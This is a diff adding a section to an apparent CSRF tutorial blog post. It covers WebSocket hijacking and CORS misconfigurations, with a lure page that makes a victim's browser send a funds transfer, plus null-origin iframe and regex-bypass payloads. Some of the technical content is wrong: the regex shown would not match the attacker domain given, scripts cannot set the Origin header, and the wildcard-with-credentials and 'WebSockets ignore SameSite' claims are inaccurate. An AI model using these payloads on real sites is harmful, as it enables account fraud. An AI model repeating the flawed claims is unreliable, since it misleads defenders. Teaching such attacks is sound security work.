@@ -353,6 +353,145 @@ Other applications do validate the `Referer` header but do so **in an insecure w
     The trusted domain appears somewhere in the URL string, even though the request comes from a malicious origin.
 
 
+## Protocol-Level SameSite BlindSpots
+
+While GET-based attacks exploit SameSite=Lax's navigation allowances, modern web applications introduce subtler vulnerabilities through protocol-level quirks—particularly in WebSockets and CORS configurations. These bypasses often work even when traditional CSRF defenses appear intact.
+
+### Websockets Silent SameSite Override
+
+Unlike HTTP, WebSocket connections (`ws://`/`wss://`) **ignore SameSite cookie policies entirely**. Browsers will automatically attach cookies (including those marked `SameSite=Lax`) if the domain matches, enabling stealthy CSRF attacks.
+
+Here is a sample websocket in Node.js
+
+```js
+const WebSocket = require('ws');
+const wss = new WebSocket.Server({ port: 3001 });
+
+// Mock user database
+const accounts = {
+  alice: { balance: 5000, sessionCookie: 'alice_session=123' }
+};
+
+wss.on('connection', (ws, req) => {
+  const cookies = req.headers.cookie;
+  
+  ws.on('message', (data) => {
+    const { cmd, amount, to } = JSON.parse(data);
+    
+    if (cmd === 'transfer' && cookies.includes('alice_session')) {
+      accounts.alice.balance -= amount;
+      ws.send(`Transferred $${amount} to ${to}. New balance: $${accounts.alice.balance}`);
+    }
+  });
+});
+```
+
+The attack flow is very much similar to what we have discussed so far, where the victim will login to the bank account, the attacker will then lure the victim with an malicious page. The browser ultimately attaches `SameSite=Lax` to the WebSocket handshake. 
+
+The exploit would look something like. 
+
+```html
+<!doctype html>
+<html>
+  <body>
+    <h1>Click to claim your prize!</h1>
+    <button onclick="attack()">Claim Now</button>
+
+    <script>
+      function attack() {
+        const ws = new WebSocket("ws://localhost:3001");
+
+        ws.onopen = () => {
+          console.log("WebSocket connected! Sending attack...");
+          ws.send(
+            JSON.stringify({
+              cmd: "transfer",
+              amount: 1000,
+              to: "attacker",
+            }),
+          );
+        };
+
+        ws.onmessage = (e) => {
+          console.log("Server response:", e.data);
+          alert("Attack result: " + e.data);
+        };
+
+        ws.onerror = (e) => {
+          console.error("WebSocket error:", e);
+          alert("Error: Open DevTools (F12) and check Console");
+        };
+      }
+    </script>
+  </body>
+</html>
+```
+
+I added some debugging text as this was a bit harder to make it work locally but we did ultimately achieve the goal of transferring the funds. 
+
+![poc](https://i.ibb.co/YB7jhFS7/image.png)
+
+
+### CORS (Cross origin resource sharing) bypasses for CSRF attacks
+
+CORS is designed to restrict cross-origin HTTP requests, but misconfigurations can enable CSRF exploits a high possibility. Normally browsers block cross-origin `POST` requests with cookies do to the `SameSite=Lax` restriction, but a misconfiguration could be set where the wildcard `*` is used that would allow all. 
+
+```
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+
+Real world bypass techniques would include: 
+#### Exploiting `null` origin 
+
+This is where some APIs would allow allow `null` origins and are common in local contexts.
+
+```js
+app.use(cors({ origin: 'null', credentials: true }));
+```
+
+In this scenario the attacker could craft something like:
+
+```html
+<iframe sandbox="allow-scripts" srcdoc='
+  <script>
+    fetch("https://bank.com/transfer", { 
+      method: "POST", 
+      credentials: "include" 
+    });
+  </script>
+'></iframe>
+```
+
+#### Regex Bypasses
+
+This is where a weak regex is used in origin validation. 
+
+```js
+app.use(cors({ origin: /bank\.com$/, credentials: true }));
+```
+
+Here an attacker could craft something like: 
+
+```js
+fetch('https://bank.com/transfer', {
+  headers: { 'Origin': 'https://bank.com.attacker.com' },  // Matches regex!
+  credentials: 'include'
+});
+```
+
+Where as long as the regex does match in the slightest a bypass works out. 
+
+To secure CORS configuration, one would only add an explicit allowlist that will only allow a particular origin. Also cookie forwarding could be blocked by setting `credentials: false`. Here is a snippet. 
+
+```js
+app.use(cors({
+  origin: 'https://trusted.com',  // Explicit allowlist
+  credentials: false,             // Block cookie forwarding
+  methods: ['GET']                // Restrict risky methods
+}));
+```
+
 ## Conclusion
 While modern defenses like CSRF tokens and SameSite cookie attributes have significantly raised the bar for CSRF attacks, they are far from foolproof. As we’ve explored, subtle implementation oversights, such as failing to validate tokens for GET requests or relying solely on browser-enforced restrictions, can create dangerous gaps in security. Attackers can exploit framework behaviors, method override gadgets, and even sibling domain vulnerabilities to sneak past seemingly solid defenses.
 
